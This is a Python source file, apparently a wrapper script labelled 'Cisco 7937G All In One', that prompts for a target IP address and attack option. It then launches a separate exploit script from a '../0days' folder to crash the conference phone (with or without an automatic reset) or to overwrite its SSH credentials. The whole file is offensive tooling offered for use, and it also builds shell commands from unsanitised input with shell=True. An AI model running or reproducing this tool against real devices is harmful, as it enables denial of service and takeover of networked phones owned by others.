import subprocess as sub


class Colors:
    red = '\033[38;2;255;0;0m\033m'
    end = '\033[m'
    green = '\033[0;32m'


print(f"""
{Colors.red}╔═══════════════════════════════════════════════════╗
{Colors.red}║    {Colors.end}[{Colors.red}1{Colors.end}]: DoS with automatic device reset           {Colors.red}║
{Colors.red}║    {Colors.end}[{Colors.red}2{Colors.end}]: DoS without automatic device reset        {Colors.red}║
{Colors.red}║    {Colors.end}[{Colors.red}3{Colors.end}]: Change SSH credentials of target device   {Colors.red}║
{Colors.red}╚═══════════════════════════════════════════════════╝
\n""")

attack_method = input(f"{Colors.red}(Cisco 7937G All In One){Colors.end} [Enter Attack Option]:~#")
class ExploitHandler(object):
    def __init__(self, username, password, host):
        self.host = host
        self.username = username
        self.password = password

    def attack_option_number_one(self):
        sub.call(f"python3 ../0days/Cisco-7937G.py -t {self.host} -a 1", shell=True)

    def attack_option_number_two(self):
        sub.call(f"python3 ../0days/Cisco-7937G.py -t {self.host} -a 2", shell=True)

    def attack_option_number_three(self):
        sub.call(
            f"python3 ../0days/Cisco-7937G.py --target {self.host} --attack 3 --user {self.username} --password {self.password}",
            shell=True)


if __name__ == "__main__":
    handler = ExploitHandler(
        username=input(f"{Colors.red}(Cisco 7937G All In One){Colors.end} [Enter Username For Change]:~#"),
        password=input(f"{Colors.red}(Cisco 7937G All In One){Colors.end} [Enter Password For Change]:~#"),
        host=input(f"{Colors.red}(Cisco 7937G All In One){Colors.end} [Enter Target Ip Address]:~#"))
    if attack_method == "1":
        handler.attack_option_number_one()
    elif attack_method == "2":
        handler.attack_option_number_two()
    elif attack_method == "3":
        handler.attack_option_number_three()
